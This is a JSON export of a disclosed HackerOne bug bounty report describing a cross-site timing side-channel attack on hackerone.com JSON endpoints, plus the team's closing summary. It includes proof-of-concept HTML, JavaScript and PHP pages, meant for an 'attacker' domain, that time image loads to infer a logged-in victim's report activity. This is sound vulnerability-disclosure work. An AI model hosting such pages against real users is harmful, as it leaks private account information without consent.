{
  "id": 348168,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDgxNjg=",
  "url": "https://hackerone.com/reports/348168",
  "title": "Timing attack towards endpoints on the web without CSRF ",
  "state": "Closed",
  "substate": "duplicate",
  "severity_rating": "low",
  "readable_substate": "Duplicate",
  "created_at": "2018-05-07T12:54:56.556Z",
  "submitted_at": "2018-05-07T12:54:56.556Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": true,
    "username": "b258ea62bf297b02afa9854",
    "url": "/b258ea62bf297b02afa9854",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 13,
    "url": "https://hackerone.com/security",
    "handle": "security",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "HackerOne",
      "twitter_handle": "Hacker0x01",
      "website": "https://hackerone.com",
      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2018-12-27T12:27:09.459Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-12-27T12:27:00.155Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:**\nWhen logged in user on HackerOne visits another web page, remote web page could get conclusion regarding this data:\n- logged in user\n- number of triaged reports in the ~last month\n- number of new reports at the moment\n- number of closed reports\n...\n\nThis conclusions are only from one endpoint https://hackerone.com/bugs.json?text_query=999999&subject=&sort_type=pg_search_rank&substates%5B%5D=triaged .\nEvery endpoint that lists data without CSRF token, but holds interesting conclusion like ( does one program have triaged reports atm )\n\n**Description:**\nYesterday I got this idea regarding getting conclusions from web endpoints that aren't protected by CSRF tokens. During the research I have employed the https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API . From the API we can read the load time for certain resource and having few another conditions enabled on some web api / endpoints we can get valuable conclusions. Check the following snippet:\n```\n<html>\n<head>\n<script>\nfunction calculate_load_times() {\n  // Check performance support\n  if (performance === undefined) {\n    console.log(\"= Calculate Load Times: performance NOT supported\");\n    return;\n  }\n\n  // Get a list of \"resource\" performance entries\n  var resources = performance.getEntriesByType(\"resource\");\n  if (resources === undefined || resources.length <= 0) {\n    console.log(\"= Calculate Load Times: there are NO `resource` performance records\");\n    return;\n  }\n\n  console.log(\"= Calculate Load Times\");\n  for (var i=0; i < resources.length; i++) {\n    // Response time\n    t = resources[i].responseEnd - resources[i].responseStart;\n    console.log(t);\n }\n}\n</script>\n</head>\n<body>\n<img id=\"grr\" src=\"https://hackerone.com/bugs.json?text_query=3%08&subject=%01&sort_type=upvotes&substates%5B%5D=spam\">\n</body>\n</html>\n```\n\n1. Host it on \"attacker\" domain\n2. If you are logged in on HackerOne and you visit attacker domain the script will work e.g. 200 response code will cause the script to measure the load time, if not load time won't be shown ( http 400, 500 status codes)\n3. Find interesting endpoints that could deliver conclusions or static data that could help in future.\n\nDetailed description:\n\nAt the moment will deliver always constant output for any logged in user ~750b: https://hackerone.com/bugs.json?text_query=999999&subject=&sort_type=pg_search_rank&substates%5B%5D=triaged  \n\nThis one too ~9200b : https://hackerone.com/programs/search.json?query=IBB&sort=published_at%3Adescending&page=1\n\nThis means we as logged in users could measure the average size in bytes from those two responses and this values are almost the same for any logged in user on HackerOne.\n\nNow when victim ( logged in on HackerOne ) visits the \"attacker\" web site, the attacker web site could measure the time needed for many calls towards this endpoints => we can get idea regarding the internet speed of victim e.g.\n\nMeasure average page load for search.json with this script 1.php ( host it, visit it logged on H1 and type `calculate_load_times()` in browser console )\n```\n<html>\n<head>\n<script>\nfunction calculate_load_times() {\n  // Check performance support\n  if (performance === undefined) {\n    console.log(\"= Calculate Load Times: performance NOT supported\");\n    return;\n  }\n\n  // Get a list of \"resource\" performance entries\n  var resources = performance.getEntriesByType(\"resource\");\n  if (resources === undefined || resources.length <= 0) {\n    console.log(\"= Calculate Load Times: there are NO `resource` performance records\");\n    return;\n  }\n\n  console.log(\"= Calculate Load Times\");\n  for (var i=0; i < resources.length; i++) {\n    // Response time\n    t = resources[i].responseEnd - resources[i].responseStart;\n    console.log(t);\n  }\n}\n</script>\n</head>\n<!-- https://hackerone.com/programs/search?query=test&sort=published_at%3Adescending&page=1 -->\n<body>\n<?php\nfor ($i=0;$i<30;$i++){\necho '<img id=grr\"'.$i.'\" src=\"https://hackerone.com/programs/search.json?query=IBB&sort=published_at%3Adescending&page=1&rnd='.rand(1,5000).'\">\n';\n}\n?>\n</body>\n</html>\n```\nSame for bugs.json with following 2.php (host it, visit it logged on H1 and type `calculate_load_times()` in browser console )\n```\n<html>\n<head>\n<script>\nfunction calculate_load_times() {\n  // Check performance support\n  if (performance === undefined) {\n    console.log(\"= Calculate Load Times: performance NOT supported\");\n    return;\n  }\n\n  // Get a list of \"resource\" performance entries\n  var resources = performance.getEntriesByType(\"resource\");\n  if (resources === undefined || resources.length <= 0) {\n    console.log(\"= Calculate Load Times: there are NO `resource` performance records\");\n    return;\n  }\n\n  console.log(\"= Calculate Load Times\");\n  for (var i=0; i < resources.length; i++) {\n    \n\n    // Response time\n    t = resources[i].responseEnd - resources[i].responseStart;\n    console.log(t);\n\n    \n  }\n}\n</script>\n</head>\n<!-- https://hackerone.com/programs/search?query=test&sort=published_at%3Adescending&page=1 -->\n<body>\n<?php\nfor ($i=0;$i<30;$i++){\necho '<img id=grr\"'.$i.'\" src=\"https://hackerone.com/bugs.json?text_query=999999&subject=&sort_type=pg_search_rank&substates%5B%5D=triaged&rnd='.rand(1,5000).'\">';\n}\n?>\n</body>\n</html>\n```\nNow having this values about the load time we can simple calculate the average time for loading for each of the `img` elements => we can calculate approximately the internet speed of the victim towards HackerOne endpoints at that moment. Having the approximate internet speed and chance for measuring time needed for load of some interesting resource we can learn from this side channel attack if victim have created report in the last few days: https://hackerone.com/bugs.json?text_query=3480&subject=&sort_type=pg_search_rank&substates%5B%5D=new\nor\nhttps://hackerone.com/bugs.json?text_query=3479&subject=&sort_type=pg_search_rank&substates%5B%5D=new\n...\nUsing the same scripts from above with specified urls. In this last urls exploiting fact is the guessing the time of the report based on report id.\nFrom measured time, we can get conclusion even for the number of reports / records in the response if we divide the content size with average size of one (json) record. :)\n\nAs extra, this kind of attacks could be performed against H1 programs in order to get knowledge if some program have triaged reports, new, closed, ...  \n\nI have performed PoC calculations based on 30 requests per endpoint from my localhost and works like a charm :)\n\n### Optional: Your Environment (Browser version, Device, etc)\n\n * any modern browser\n\n### Optional: Supporting Material/References (Screenshots)\n\n * https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API/Using_the_Resource_Timing_API\n\n## Impact\n\nAny endpoint on the net is vulnerable on this type of attack due the fact it is side channel attack which could be prevented only if CSRF tokens are supplied in the request as variables. This way, using this attack approach could be ex filtrated /learned many many information from visiting users who are logged in on services that host sensitive data regarding them. I'll continue with this research",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": 4701,
  "original_report_url": "https://hackerone.com/reports/4701",
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 33,
  "voters": [
    "ali",
    "s_p_q_r",
    "dhakal_ananda",
    "terjanq",
    "shubham_srt",
    "asad0x01_",
    "savitar0x01",
    "michan",
    "whitesector",
    "eveeez",
    "and 23 more..."
  ],
  "severity": {
    "rating": "low",
    "score": 2.9,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "high",
      "privileges_required": "low",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 3,
    "asset_type": "URL",
    "asset_identifier": "hackerone.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 13029,
      "category": "team",
      "content": "[mslavco](https://twitter.com/mslavco) submitted a report to us that identified a way to extract certain information about reports. In our testing the method was not reliable enough to exploit this in the wild, which is why no fix was prioritized. In 2019 this endpoint will likely be deprecated and we'll move to GraphQL to query the information. This new endpoint will require a token, which means it won't be susceptible to the described attack. We'd like to thank [mslavco](https://twitter.com/mslavco) for their report.\n\nEven though we don't publicly disclose reports that weren't closed as Resolved, we're making an exception here for transparency's sake. Multiple accusations, by different actors, have been made of harassment, hate speech and discrimination by the reporter. We've investigated the accusations and determined that this was not the case.\n\nAlso see #350432.",
      "user": {
        "id": 2,
        "username": "jobert",
        "name": "Jobert Abma",
        "bio": "Co-founder of HackerOne. ಠ_ಠ",
        "cleared": true,
        "verified": true,
        "website": "https://hackerone.com",
        "location": "San Francisco, CA",
        "created_at": "2013-03-08T01:17:12.256Z",
        "url": "https://hackerone.com/jobert",
        "hackerone_triager": false,
        "hackerone_employee": true,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
